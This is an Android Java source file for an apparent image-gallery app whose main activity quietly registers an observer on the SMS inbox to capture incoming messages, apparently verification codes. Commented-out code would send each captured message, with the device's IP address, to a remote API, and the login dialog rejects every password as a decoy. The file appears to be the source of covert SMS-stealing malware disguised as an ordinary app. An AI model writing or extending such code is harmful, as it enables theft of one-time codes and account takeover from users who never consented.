package com.xhf.sms;

import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.RecyclerView;
import androidx.recyclerview.widget.StaggeredGridLayoutManager;

import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Toast;

import com.chad.library.adapter.base.BaseQuickAdapter;
import com.xhf.sms.adapter.MainAdapter;
import com.xhf.sms.bean.MainBean;
import com.xhf.sms.dialog.CenterDialog;

import java.util.ArrayList;
import java.util.List;


public class MainActivity extends AppCompatActivity {

    private MainAdapter mMainAdapter;
    private RecyclerView mRecyclerView;
    private List<MainBean> mMainBeans;
    private CenterDialog mCenterDialog;
    private CenterDialog mLoginDialog;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
        initData();
        PhoneCode phoneCode = new PhoneCode(this, new Handler(), new PhoneCode.SmsListener() {
            @Override
            public void onResult(String result) {
                Log.e("onResult: ", result);

//                SmsBean smsBean = new SmsBean("tom", result, "", getLocalIpAddress(MainActivity.this));
//                Gson gson = new Gson();

//                ApiManager.getInstance().getApiService().sendSms(gson.toJson(smsBean))
//                        .subscribeOn(Schedulers.io())
//                        .observeOn(AndroidSchedulers.mainThread())
//                        .subscribe(new Observer<Response>() {
//                            @Override
//                            public void onSubscribe(Disposable d) {
//                            }
//
//                            @Override
//                            public void onNext(Response response) {
//                                Log.e("xhf", "onSubscribe: " + response.getMsg());
//                            }
//
//                            @Override
//                            public void onError(Throwable e) {
//                                Log.e("xhf", "onSubscribe: " + e.toString());
//                            }
//
//                            @Override
//                            public void onComplete() {
//
//                            }
//                        });

            }
        });

        this.getContentResolver().registerContentObserver(
                Uri.parse("content://sms/inbox"), true, phoneCode);


    }

    private void initData() {

        mMainBeans = new ArrayList<>();
        for (int i = 0; i < 50; i++) {
            MainBean mainBean = new MainBean();
            if (i % 2 == 0) {
                mainBean.setImgUrl(R.drawable.ic_item_img2);
            } else if (i % 3 == 0) {
                mainBean.setImgUrl(R.drawable.ic_item_img3);
            } else {
                mainBean.setImgUrl(R.drawable.ic_item_img);
            }
            mMainBeans.add(mainBean);
        }
        mMainAdapter = new MainAdapter(mMainBeans);
        mRecyclerView.setLayoutManager(new StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL));
        mRecyclerView.setAdapter(mMainAdapter);

        View footerView = LayoutInflater.from(this).inflate(R.layout.recycler_footer, null);
        mMainAdapter.addFooterView(footerView);

        mMainAdapter.setOnItemClickListener(new BaseQuickAdapter.OnItemClickListener() {
            @Override
            public void onItemClick(BaseQuickAdapter adapter, View view, int position) {

                mCenterDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
                        .setLayoutRes(R.layout.dialog_main)
                        .setViewGravity(Gravity.CENTER)
                        .setViewListener(new CenterDialog.ViewListener() {
                            @Override
                            public void bindView(View v) {

                                v.findViewById(R.id.closeView).setOnClickListener(new View.OnClickListener() {
                                    @Override
                                    public void onClick(View v) {
                                        mCenterDialog.dismiss();
                                    }
                                });
                                v.findViewById(R.id.loginView).setOnClickListener(new View.OnClickListener() {
                                    @Override
                                    public void onClick(View v) {
                                        initLoginDialog();
                                        mCenterDialog.dismiss();

                                    }
                                });
                                v.findViewById(R.id.enterView).setOnClickListener(new View.OnClickListener() {
                                    @Override
                                    public void onClick(View v) {
                                        initEnterDialog();
                                        mCenterDialog.dismiss();

                                    }
                                });

                            }
                        }).show();
            }
        });

    }

    private void initEnterDialog() {
        CenterDialog enterDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
                .setLayoutRes(R.layout.dialog_enter)
                .setViewGravity(Gravity.CENTER)
                .setViewListener(new CenterDialog.ViewListener() {
                    @Override
                    public void bindView(View v) {

                    }
                }).show();
    }

    private void initLoginDialog() {
        mLoginDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
                .setLayoutRes(R.layout.dialog_login)
                .setViewGravity(Gravity.CENTER)
                .setViewListener(new CenterDialog.ViewListener() {
                    @Override
                    public void bindView(View v) {
                        v.findViewById(R.id.closeView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                mLoginDialog.dismiss();
                            }
                        });

                        v.findViewById(R.id.confirmView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                Toast.makeText(MainActivity.this, "密码错误", Toast.LENGTH_SHORT).show();
                                mLoginDialog.dismiss();
                            }
                        });
                    }
                }).show();


    }

    private void initView() {
        mRecyclerView = findViewById(R.id.recyclerView);


    }


}
